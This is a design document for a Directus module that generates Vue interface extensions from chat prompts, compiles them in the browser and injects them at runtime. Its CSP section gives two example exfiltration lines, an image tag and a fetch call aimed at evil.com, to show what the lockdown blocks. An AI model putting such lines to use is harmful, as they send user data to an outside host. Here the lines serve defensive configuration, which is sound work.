# AI Extension Builder - Design Document

## Overview

A Directus module that enables users to generate custom interfaces via chat (like v0/Lovable). Extensions are stored in DB and loaded at runtime without installation.

## Scope (Hackathon MVP)

**Focus:** Interface extensions only (panels/modules later)

**Core flow:**
1. User opens module → chat interface
2. Describes interface in natural language
3. AI generates Vue SFC + InterfaceConfig
4. Live preview with real data from selected collection/item
5. Iterate via chat refinements
6. Publish → extension available in field config

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                   AI Extension Builder Module                    │
├─────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │  Chat UI     │───▶│ AI Service   │───▶│ vue3-sfc-loader  │  │
│  │  (prompt)    │    │ (generate)   │    │ (compile)        │  │
│  └──────────────┘    └──────────────┘    └────────┬─────────┘  │
│         │                                          │            │
│         ▼                                          ▼            │
│  ┌──────────────┐                        ┌──────────────────┐  │
│  │  Preview     │◀───<component :is>─────│ Compiled Component│  │
│  │  (in-app)    │    (reactive swap)     │ (Vue instance)   │  │
│  └──────────────┘                        └────────┬─────────┘  │
│                                                   │            │
│                                          ┌────────▼─────────┐  │
│                                          │ Save to DB       │  │
│                                          │ (ai_extensions)  │  │
│                                          └──────────────────┘  │
├─────────────────────────────────────────────────────────────────┤
│  On Publish: Inject to running app via app.component() +       │
│              useExtensions() shallowRef mutation                │
└─────────────────────────────────────────────────────────────────┘
```

---

## Technical Decisions

### 1. Browser SFC Compilation

**Choice:** `vue3-sfc-loader` (371kb gzip)

Handles multi-file imports, TypeScript, scoped CSS automatically. Both this and raw `@vue/compiler-sfc` use `new Function()` internally - same security model, but vue3-sfc-loader saves ~200 lines of import resolution code.

```ts
import { loadModule } from 'vue3-sfc-loader';

async function compileExtension(ext: AiExtension) {
  return loadModule(`/${ext.entry}`, {
    getFile: (url) => ext.files[url.replace(/^\//, '')],
    addStyle: (css) => injectStyle(css, ext.slug),
    moduleCache: { vue: Vue }
  });
}
```

**Multi-file imports work automatically:**
```vue
<!-- index.vue -->
<script setup>
import ColorButton from './components/ColorButton.vue'  // Just works
</script>
```

**Why not raw @vue/compiler-sfc?** Requires manual import resolution, topological sorting, async wrapper hacks. Not worth 357kb savings for hackathon.

### 2. Runtime Component Injection

Works after app mount:

```ts
const app = document.querySelector('#app')?.__vue_app__;
app.component('interface-my-custom', MyComponent);

// Trigger reactivity
const extensions = useExtensions();
extensions.interfaces.value = [...extensions.interfaces.value, newConfig];
```

**Key:** Directus uses `shallowRef` - must replace `.value` entirely.

### 3. Live Preview with Real Data

User selects:
- Collection (dropdown)
- Item (collection-item-dropdown)
- Field to bind

Preview renders interface with actual field value. **Sandboxed** - edits don't affect real item.

### 4. Live Preview (In-App)

**Choice:** Render directly in main app (not iframe)

Interfaces need global Directus components (VButton, VInput, etc.) which aren't available in an isolated iframe.

```vue
<template>
  <component :is="previewComponent" v-bind="previewProps" @input="onPreviewInput" />
</template>
```

- `previewComponent` is a `shallowRef` updated on each recompile
- Template-only changes: component swapped, state lost (acceptable for preview)
- Real data from selected collection/item passed via props
- Edits sandboxed - `@input` captured but not persisted

### 5. External Dependencies

Directus externalizes these (provided at runtime):
```ts
['@directus/extensions-sdk', 'vue', 'vue-router', 'vue-i18n', 'pinia']
```

**MVP constraint:** Generated interfaces use props/emit only. No SDK imports, no vue-i18n, no pinia, no vue-router. Only `import { ref, computed, ... } from 'vue'` allowed. All data passed via props.

### 6. CSP Configuration

Browser SFC compilation requires `new Function()` which needs `'unsafe-eval'`. Lock down everything else.

**Directus config** (env vars):
```bash
# Required for SFC compilation
CONTENT_SECURITY_POLICY_DIRECTIVES__SCRIPT_SRC="'self' 'unsafe-eval'"
CONTENT_SECURITY_POLICY_DIRECTIVES__STYLE_SRC="'self' 'unsafe-inline'"

# Strict lockdowns - prevent data exfiltration
CONTENT_SECURITY_POLICY_DIRECTIVES__IMG_SRC="'self' data:"
CONTENT_SECURITY_POLICY_DIRECTIVES__CONNECT_SRC="'self'"
CONTENT_SECURITY_POLICY_DIRECTIVES__FRAME_SRC="'none'"
CONTENT_SECURITY_POLICY_DIRECTIVES__OBJECT_SRC="'none'"
CONTENT_SECURITY_POLICY_DIRECTIVES__BASE_URI="'self'"
CONTENT_SECURITY_POLICY_DIRECTIVES__FORM_ACTION="'self'"
```

**What this blocks:**
- `<img src="https://evil.com/steal?data=...">` - data exfil via images
- `fetch('https://evil.com')` - data exfil via XHR
- `<iframe>`, `<object>`, `<embed>` - external content embedding

**Can't avoid:**
- `'unsafe-eval'` - required for `new Function()`
- `'unsafe-inline'` styles - required for scoped CSS injection

**Security note:** Acceptable for admin-only tooling. Generated code runs in authenticated admin context, similar to Flows/Operations.

### 7. Multi-File Extensions

Following v0/Lovable patterns: small, focused components over monolithic files.

**Storage:** Virtual file system in JSON
```ts
{
  files: {
    'index.vue': '<template>...</template>',
    'components/ColorButton.vue': '<template>...</template>',
    'utils/colors.ts': 'export const presets = [...]'
  },
  entry: 'index.vue'
}
```

**Import Resolution:** Handled automatically by vue3-sfc-loader via `getFile` callback. No manual resolution needed.

**Constraint:** Only relative imports within the virtual FS. External deps (vue, etc.) provided via moduleCache.

### 8. Extension Persistence (MVP)

**Strategy:** Accept broken-on-refresh for hackathon.

```
Hard refresh → App renders → Fields using AI interfaces show "unknown interface"
            → AI Builder module loads → Fetches published extensions from DB
            → Compiles & injects → Fields now work
```

**Why acceptable for MVP:**
- Admin-only tool, not end-user facing
- Extensions work after brief delay (~1-2s)
- Avoids complex boot-time injection hooks
- Can solve properly post-hackathon

**Auto-load on module init:**
```ts
// In ai-extension-builder module setup
onMounted(async () => {
  const { data: published } = await api.get('/items/ai_extensions', {
    params: { filter: { status: { _eq: 'published' } } }
  });
  for (const ext of published) {
    await injectExtension(ext);
  }
});
```

**Post-MVP improvement:** Hook into Directus boot sequence or create custom extension source endpoint.

### 9. Compilation & Injection Flow

**Preview Flow (during chat editing):**
```
User prompt → AI generates files → vue3-sfc-loader compiles
           → previewComponent ref updated → <component :is> re-renders
           → User iterates
```

**Publish Flow:**
```ts
async function publishExtension(ext: AiExtension) {
  // 1. Save to DB
  await api.post('/items/ai_extensions', { ...ext, status: 'published' });

  // 2. Inject into running app
  await injectExtension(ext);
}

async function injectExtension(ext: AiExtension) {
  const app = document.querySelector('#app')?.__vue_app__;

  // Compile (with error handling)
  let component;
  try {
    component = await loadModule(`/${ext.entry}`, {
      getFile: (url) => ext.files[url.replace(/^\//, '')],
      addStyle: (css) => injectStyle(css, ext.slug),
      moduleCache: { vue: Vue }
    });
  } catch (err) {
    console.error(`Failed to compile extension ${ext.slug}:`, err);
    return; // Skip this extension, don't crash
  }

  // Register Vue component
  app.component(`interface-${ext.slug}`, component);

  // Update extensions store (triggers reactivity)
  const { useExtensions } = await import('@/extensions');
  const extensions = useExtensions();
  extensions.interfaces.value = [
    ...extensions.interfaces.value,
    { ...ext.extension_config, component }
  ];
}
```

**Style Management** (prevent CSS orphaning on recompile):
```ts
const styleRegistry = new Map<string, HTMLStyleElement>();

function injectStyle(css: string, extSlug: string) {
  // Remove old styles for this extension
  styleRegistry.get(extSlug)?.remove();

  const style = document.createElement('style');
  style.textContent = css;
  style.dataset.aiExtension = extSlug;
  document.head.appendChild(style);
  styleRegistry.set(extSlug, style);
}
```

**Error Handling:**
```vue
<!-- PreviewPanel.vue -->
<template>
  <div class="preview-container">
    <component
      v-if="!error"
      :is="previewComponent"
      v-bind="previewProps"
      @input="onPreviewInput"
    />
    <v-notice v-else type="danger">
      {{ error.message }}
    </v-notice>
  </div>
</template>

<script setup>
import { onErrorCaptured, ref } from 'vue';

const error = ref(null);

onErrorCaptured((err) => {
  error.value = err;
  return false; // Prevent propagation
});
</script>
```

---

## Data Model

### Collection: `ai_extensions`

```
id              uuid        PK
slug            string      unique, used as extension id
name            string      display name
type            string      'interface' | 'panel' | 'module'
icon            string      material icon name
description     text

files           json        Virtual file system: { "index.vue": "...", "components/Button.vue": "..." }
entry           string      Entry point filename, default "index.vue"
extension_config json       InterfaceConfig (minus component)

status          string      'draft' | 'published'
version         integer     incremented on save

user_created    uuid        FK directus_users
date_created    timestamp
user_updated    uuid        FK directus_users
date_updated    timestamp

ai_prompt       text        original generation prompt
ai_model        string      model used
```

---

## AI Generation

### What AI Generates

**1. Vue SFC:**
```vue
<template>
  <div class="color-picker">
    <button v-for="c in presets" :style="{background: c}" @click="emit('input', c)" />
  </div>
</template>

<script setup lang="ts">
defineProps<{ value: string | null }>();
const emit = defineEmits<{ input: [value: string] }>();
const presets = ['#ff5500', '#0066ff'];
</script>

<style scoped>
.color-picker { /* --theme--* variables */ }
</style>
```

**2. InterfaceConfig:**
```ts
{
  id: 'ai-color-picker',
  name: 'Brand Color Picker',
  icon: 'palette',
  description: 'Pick from preset brand colors',
  types: ['string'],
  group: 'standard',
  options: [...]
}
```

### System Prompt Context

Must include:
- Directus components (VButton, VInput, VCard...)
- CSS variables (--theme--primary, etc.)
- InterfaceConfig shape and constraints
- Props interface receive (value, width, type, collection, field, etc.)
- Emit pattern (`emit('input', value)`)

### Error Handling

AutoFix loop:
1. Generate code
2. Compile
3. If errors → feed back to AI with error messages
4. Regenerate (max 3 attempts)

### Generation Quality Standards

**Code Size & Structure:**
- Components <300 lines (else split into sub-components)
- Avoid props drilling >2-3 levels (use provide/inject)
- Computed over watchers where applicable
- No v-if/v-show soup—simple conditional logic
- Never mutate props directly

**Naming Clarity (Five-Second Rule):**
- All names must be self-documenting
- ✅ `validateColorValue`, `onColorSelect`, `emitColorChange`
- ❌ `handle`, `process`, `doStuff`, `data`

**Type Safety:**
- Use proper inference—no unchecked `any`
- No type assertions (`as`) hiding real issues
- Use type guards for runtime checks
- All props must have explicit types via `defineProps<{}>()`

**Testability:**
- Pure functions extractable to utils
- Clear input/output contracts
- Props as single source of truth
- Avoid complex side effects in watchers

**Permissions & Accountability:**
If generated code accesses Directus data:
- Accept optional `accountability` prop
- Pass to services: `new ItemsService({ schema, accountability })`
- Warn users if interface requires elevated permissions

**Multi-File Decision:**
- <300 lines + single responsibility → monolithic `index.vue`
- Reusable sub-components or >300 lines → split files
- Shared logic → extract to `utils/*.ts`

### Discovery Questions (Before Generating)

Chat should ask before generating:
1. **What field types** will this interface support? (string, json, integer...)
2. **What's the use case?** (data entry, display, validation...)
3. **Any constraints?** (read-only, required validation, specific styling...)
4. **Need to access other data?** (related collections, user info...)

### Red Flags (AI Should Refuse/Suggest Alternative)

- Building what Directus already provides (use existing interface)
- Requesting admin-only features without permission checks
- No clear user benefit / over-engineering
- Violating Directus design patterns

---

## Module Structure

```
extensions/
  ai-extension-builder/
    src/
      module/
        index.ts              # defineModule
        routes.ts             # Vue Router config
        views/
          BuilderView.vue     # Main view
        components/
          ChatPanel.vue       # Chat interface
          CodeEditor.vue      # Monaco/CodeMirror (optional)
          PreviewPanel.vue    # Live preview (in-app)
          PreviewControls.vue # Collection/item/field selectors
        composables/
          use-sfc-compiler.ts # vue3-sfc-loader wrapper
          use-extension-injector.ts # Runtime injection
          use-ai-generation.ts # AI API calls
        utils/
          get-directus-app.ts # Extract Vue app instance
      endpoint/
        index.ts              # CRUD for ai_extensions
```

---

## Open Questions

### Critical (Must Resolve)

1. **SDK access in generated code**
   - How to expose `@directus/extensions-sdk` to moduleCache?
   - Or: keep MVP simple with props-only (no useApi, useStores)?

2. ~~**Preview iframe security**~~ **RESOLVED**: In-app rendering, no iframe

3. ~~**Extension persistence on restart**~~ **RESOLVED**: Accept broken-on-refresh for MVP, inject after module loads

### Important (Should Resolve)

4. **Options schema generation**
   - AI generates `options` array for interface config
   - How to validate/preview the options UI?

5. **Type compatibility**
   - InterfaceConfig.types determines which field types can use it
   - AI needs to infer correct types from prompt

6. **Existing AI integration**
   - Directus has `useAiStore`, `defineTool`
   - Should we integrate with existing AI chat or build separate?

### Nice to Have

7. **Version history**
   - Separate `ai_extensions_versions` table?
   - Or just keep latest?

8. **Export/import**
   - Export as installable extension?
   - Share between instances?

---

## Next Steps

1. Scaffold module structure
2. Implement basic chat UI (can reuse Directus AI components?)
3. Implement vue3-sfc-loader compilation
4. Build in-app preview with `<component :is>`
5. Add collection/item/field selectors
6. Implement runtime injection
7. Create endpoint for ai_extensions CRUD
8. Build AI generation with system prompt
9. Add publish flow

---

## References

- [vue3-sfc-loader](https://github.com/FranckFreiburger/vue3-sfc-loader) - browser SFC compilation
- [vue3-sfc-loader examples](https://github.com/FranckFreiburger/vue3-sfc-loader/blob/main/docs/examples.md) - nested components pattern
- [get-directus-app.ts](https://github.com/directus-labs/extensions/blob/main/packages/command-palette-module/src/utils/get-directus-app.ts)
- [Directus CSP config](https://docs.directus.io/configuration/security-limits.html)
- Directus externals: `packages/extensions/src/shared/constants/shared-deps.ts`
- Extension build: `packages/extensions-sdk/src/cli/commands/build.ts`
- [v0 system prompt](https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools) - multi-file patterns
- [Lovable system prompt](https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools) - component architecture
